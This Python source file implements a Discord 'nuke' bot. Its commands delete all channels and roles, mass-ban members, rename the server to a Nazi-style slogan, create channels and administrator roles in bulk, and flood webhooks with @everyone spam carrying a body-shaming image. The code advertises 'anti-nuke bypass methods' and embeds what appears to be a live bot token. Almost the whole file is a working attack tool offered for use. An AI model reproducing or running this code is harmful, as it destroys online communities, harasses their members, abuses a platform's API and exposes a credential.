from typing import Optional
from ast import literal_eval
from itertools import cycle
import aiohttp
import discord
import uvloop
from discord.ext import commands
from discord.ext.commands.bot import when_mentioned_or
from aioconsole import aprint
from time import perf_counter
import asyncio
import ujson
import aiofiles
from requests import OptimisedHTTP
import base64



uvloop.install()


# Configuration Options ----- 

TOKEN = "MTAwNTIzODEzNzYyMDAyMTMzOA.GeGq1h.riWW958tm7z4pxoTWHNp3ADD9cJKag7N6GwCJ0"
BOT_NAME = "POOPOO BOT"
PREFIX = "!"

# Whether you want to manually spam using a command, or begin spam immediately upon channel creation
WSPAM = True

# Amount of channels/roles to create
AMOUNT = 50

# Names of Role/Channel/Webhook to create
NAMES = cycle([
    "CHAOS CHAOS", "HEIL ALEX LOL"
])

GUILD_NAME = "HEIL ALEX LOL"

# Type of channel to create. Default is 0, text channel
# Read docs here for a list of channel types. https://discord.com/developers/docs/resources/channel#channel-object-channel-types
CHANNEL_TYPE = 0

# Message for webhook to send
# Uses a discord embed
rel_emb = discord.Embed(title="YOU ARE FAT", description="You have the fat unfortunately. Image below is a representation of you. Please do not fret you can be fixed.")
rel_emb.set_image(url="https://cdn.discordapp.com/attachments/1184556177619689663/1186434636205785108/unknown-1.png?ex=65933c5c&is=6580c75c&hm=dbed4878948b4f1fa0fb360d8c3f2bbbfbd7042e2d292064226b959f9862f14c&")
SPAM_EMBED = rel_emb.to_dict()
CONTENT = "@everyone"

ROOT = "https://discord.com/api/v9"
bot = commands.Bot(
    command_prefix=when_mentioned_or(PREFIX),
    intents=discord.Intents.all(),
    case_insensitive=True,
    help_command=None
)

# How many concurrent tasks to be ran at once
# Discords global ratelimits are 50/s, setting this above 50 will be redundant unless you add a proxy implementation
SEMAPHORE = 45

# You can change this to 50 if you want
# Discords global ratelimits are 50/s
# This sets up a semaphore
# Only n amount of requests sent through this client are handled at once
# Basically lazy request handling
client = OptimisedHTTP(SEMAPHORE)

def generate_obj(method: str, url: str, json: Optional[dict] = None) -> dict:
    obj = {"method": method, "url": ROOT + url, "headers": {
        "authorization": f"Bot {TOKEN}",
        "content-type": "application/json",
    }}
    if json is not None:
        obj['json'] = json
    return obj

def debug_embed(*args, **kwargs):
    """Embed for debugging purposes

    Returns:
        discord.Embed: 
    """
    desc = f"```{client}\n\n\n{args}```"
    if len(desc) > 4000:
        desc = desc[:3990]+"```"
    return discord.Embed(title="Debug", description=desc)

# HTTP Requests Wrapped in functions ------

async def channel_deletes(ctx):
    resps = await client.requests(
        [
            generate_obj("DELETE", f"/channels/{channel.id}")
            for channel in ctx.guild.channels
        ]
    )
    return resps

async def channel_creates(ctx):
    resps = await client.requests(
        [
            generate_obj(
                "POST", f"/guilds/{ctx.guild.id}/channels",
                json={"name": next(NAMES), "type": CHANNEL_TYPE, "permission_overwrites": []}
            )
            for i in range(AMOUNT)
        ]
    )
    return resps

async def role_creates(ctx):
    resps = await client.requests(
        [
            generate_obj(
                "POST", f"/guilds/{ctx.guild.id}/roles",
                json={"name": next(NAMES), "permissions": "8"}
            )
            for i in range(AMOUNT)
        ]
    )
    return resps

async def role_deletes(ctx):
    for i in range(0, len(ctx.guild.roles), 50):
        resps = await client.requests(
            [
                generate_obj("DELETE", f"/guilds/{ctx.guild.id}/roles/{role.id}")
                for role in ctx.guild.roles[i:i+50]
            ]
        )
    return resps

async def bypass_channel_creates(ctx):
    resps = await client.requests(
        [
            generate_obj(
                "PATCH", f"/guilds/{ctx.guild.id}",
                json={
                    "features":["COMMUNITY"],
                    "verification_level":1,
                    "default_message_notifications":1,
                    "explicit_content_filter":2,
                    "rules_channel_id":"1",
                    "public_updates_channel_id":"1"
                }
            )
            for i in range(AMOUNT)
        ]
    )

async def massban(ctx):
    for i in range(0, len(ctx.guild.members), 50):
        resps = await client.requests(
            [
                generate_obj(
                    "PUT", f"/guilds/{ctx.guild.id}/bans/{user}",
                    json={"delete_message_seconds":604800}
                )
                for user in ctx.guild.members[i:i+50]
            ]
        )

async def edit_guild(ctx):
    async with aiofiles.open("./icon.jpg", "rb") as f:
        img = base64.b64encode((await f.read()))
        # await aprint(img[:100])
        obj = str(img).split("'", 2)

        resps = await client.requests(
            [
                generate_obj(
                    "PATCH", f"/guilds/{ctx.guild.id}",
                    json={
                        "name": GUILD_NAME,
                        "icon": f"data:image/png;base64,{obj[1]}",
                        "splash":None,"banner":None,"home_header":None,"afk_channel_id":None,
                        "afk_timeout":300,"system_channel_id":None,"verification_level":1,
                        "default_message_notifications":1,"explicit_content_filter":2,"system_channel_flags":0,
                        "public_updates_channel_id":1,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False
                    }
                )
            ]
        )
        return resps


async def edit_channel_names(ctx):
    resps = await client.requests(
        [
            generate_obj(
                "PATCH",
                f"/channels/{channel.id}",
                json={
                    "name": next(NAMES)
                }
            )
            for channel in ctx.guild.channels
        ]
    )

async def create_webhook(channel):
    resp = await client.requests(
        [
            generate_obj(
                "POST", f"/channels/{channel.id}/webhooks",
                json={"name": next(NAMES)}
            )
        ]
    )
    return resp

async def spam_webhook(id: str, web_token: str):
    webhooks = [literal_eval(webhook) for webhook in open("webhooks.txt").read().splitlines()]
    while True:
        if WSPAM:
            await client.requests(
                [
                    generate_obj(

                        "POST",
                        f"/webhooks/{webhook['id']}/{webhook['token']}",
                        json={"content": CONTENT, "embeds": [SPAM_EMBED]}
                    )
                    for webhook in webhooks
                ]
            )
        await client.requests(
            [
                generate_obj(

                    "POST",
                    f"/webhooks/{id}/{web_token}",
                    json={"content": CONTENT, "embeds": [SPAM_EMBED]}
                )
            ]
        )




@bot.event
async def on_ready():
    await aprint(f"MUH {BOT_NAME} READY")

@bot.command(name="help", description="Displays the bot's commands.", aliases=['info'])
async def _help(ctx):
    await ctx.message.delete()
    emb = discord.Embed(title=BOT_NAME, description=f"*Information regarding commands are listed below. Prefix is `{PREFIX}`*")
    for command in bot.walk_commands():
        emb.add_field(name=f"**`⊚  {command.name}`**", value=f"*{command.description}*", inline=False)
    await ctx.send(embed=emb)

@bot.command(name="cd", description="Deletes all channels", aliases=['channeldelete', 'chandel'])
async def _cd(ctx):
    await ctx.message.delete()
    resps = await channel_deletes(ctx)
    await ctx.send(embed=debug_embed(resps))

@bot.command(name="cc", description="Mass creates channels", aliases=["channelcreate", "chancreate"])
async def _cc(ctx):
    await ctx.message.delete()
    resps = await channel_creates(ctx)
    await ctx.send(embed=debug_embed(resps))

@bot.command(name="rc", description="Mass creates roles", aliases=['rolecreate', 'rolec'])
async def _rc(ctx):
    await ctx.message.delete()
    resps = await role_creates(ctx)
    await ctx.send(embed=debug_embed(resps))

@bot.command(name="rd", description="Deletes all roles", aliases=['roledelete', 'roledel'])
async def _rd(ctx):
    await ctx.message.delete()
    resps = await role_deletes(ctx)
    await ctx.send(embed=debug_embed(resps))

@bot.command(name="bypasscc", description="Creates channels using anti-nuke bypass methods", aliases=['cch'])
async def _cch(ctx):
    await ctx.message.delete()
    resps = await bypass_channel_creates(ctx)
    other_resps = await edit_channel_names(ctx)
    await ctx.send(embed=debug_embed(resps, other_resps))

@bot.command(name="massban", description="Attempts to ban all users", aliases=['banall', 'ban'])
async def _ban(ctx):
    resps = await massban(ctx)
    await ctx.send(embed=debug_embed(resps))

@bot.command(name="bypassnuke", description="Nukes using anti-nuke bypass methods", aliases=['nukeh'])
async def _nukeh(ctx):
    await ctx.message.delete()
    await edit_guild(ctx)
    await channel_deletes(ctx)
    await massban(ctx)
    await bypass_channel_creates(ctx)
    await edit_channel_names(ctx)
    await role_deletes(ctx)
    await role_creates(ctx)


@bot.command(name="nuke", description="Nukes a server", aliases=['wizz'])
async def _nuke(ctx):
    await ctx.message.delete()
    await edit_guild(ctx)
    await channel_deletes(ctx)
    ## await massban(ctx)
    await channel_creates(ctx)
    await edit_channel_names(ctx)
    await role_deletes(ctx)
    await role_creates(ctx)

@bot.command(name="editguild", description="Edits guild", aliases=['edit'])
async def _edit(ctx):
    resp = await edit_guild(ctx)
    await ctx.send(embed=debug_embed(resp))

@bot.command(name="test", description="tests stuf, probably not real")
async def testing(ctx):
    async def req(role):
        while True:
            async with aiohttp.ClientSession() as session:
                async with session.delete(ROOT + f"/guilds/{ctx.guild.id}/roles/{role.id}", headers={
                    "authorization": f"Bot {TOKEN}",
                    "content-type": "application/json",
                }) as resp:
                    if resp.ok:
                        return
                    elif resp.status == 429:
                        json = await resp.json()
                        await asyncio.sleep(json['retry_after'])
                    else:
                        return

    await asyncio.gather(*(
        asyncio.create_task(req(role))
        for role in ctx.guild.roles
    ))



@bot.command(name="spam", description="Begins spamming using stored webhooks", aliases=["wspam"])
async def _wspam(ctx):
    await spam_webhook("","")

@bot.event
async def on_guild_channel_create(channel):
    webhook = await create_webhook(channel)
    if WSPAM:
        try:
            # Check if it is a dictionary, will error and return otherwise
            webhook[0].get("id")

            async with aiofiles.open("./webhooks.txt", "a+") as f:
                await f.write(str(webhook[0])+ "\n")
        except:
            return
        return
    asyncio.create_task(spam_webhook(webhook[0]['id'], webhook[0]['token']))




bot.run(TOKEN)